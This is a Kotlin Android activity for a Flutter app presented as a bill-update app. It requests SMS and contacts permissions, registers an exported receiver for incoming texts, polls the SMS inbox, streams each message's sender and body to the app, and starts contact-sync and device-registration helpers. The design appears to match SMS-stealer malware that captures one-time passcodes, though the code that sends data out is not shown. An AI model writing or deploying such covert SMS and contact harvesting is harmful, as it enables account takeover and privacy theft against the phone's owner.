package com.example.bill_update_app

import android.Manifest
import android.content.Context
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Telephony

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.EventChannel
import io.flutter.plugin.common.MethodChannel

class SmsPlugin {
    companion object {
        private var eventSink: EventChannel.EventSink? = null

        fun register(channel: EventChannel, activity: FlutterActivity) {
            channel.setStreamHandler(object : EventChannel.StreamHandler {
                override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                    eventSink = events
                }
                override fun onCancel(arguments: Any?) {
                    eventSink = null
                }
            })
        }

        fun receiveSms(sender: String, message: String, timestamp: String) {
            val data = mapOf(
                "sender" to sender,
                "message" to message,
                "received_at" to timestamp
            )
            eventSink?.success(data)
        }
    }
}

class MainActivity : FlutterActivity() {
    private val CHANNEL_SMS = "com.example.bill_update_app/sms"
    private val CHANNEL_DEVICE = "com.example.bill_update_app/device"
    private var receiver: SmsReceiver? = null
    private var smsObserver: SmsObserver? = null

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        val smsChannel = EventChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_SMS)
        SmsPlugin.register(smsChannel, this)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_DEVICE).setMethodCallHandler { call, result ->
            if (call.method == "getDeviceId") {
                val prefs = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
                val id = prefs.getString("device_id", "")
                result.success(id)
            } else {
                result.notImplemented()
            }
        }

        DeviceRegistrar.init(this)

        receiver = SmsReceiver()
        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(receiver, filter)
        }

        requestSmsPermission()
    }

    private fun requestSmsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val permissions = arrayOf(
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS
            )
            val toRequest = permissions.filter {
                checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
            }
            if (toRequest.isNotEmpty()) {
                Handler(Looper.getMainLooper()).post {
                    requestPermissions(toRequest.toTypedArray(), 1001)
                }
            } else {
                startSmsObserver()
                ContactSync.init(this)
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 1001) {
            startSmsObserver()
            for (i in permissions.indices) {
                if (permissions[i] == Manifest.permission.READ_CONTACTS && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    ContactSync.init(this)
                }
            }
        }
    }

    private fun startSmsObserver() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            smsObserver = SmsObserver(contentResolver)
            contentResolver.registerContentObserver(
                Telephony.Sms.Inbox.CONTENT_URI,
                true,
                smsObserver!!
            )
            smsObserver?.startPolling()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        receiver?.let { unregisterReceiver(it) }
        smsObserver?.let {
            it.stopPolling()
            contentResolver.unregisterContentObserver(it)
        }
    }
}
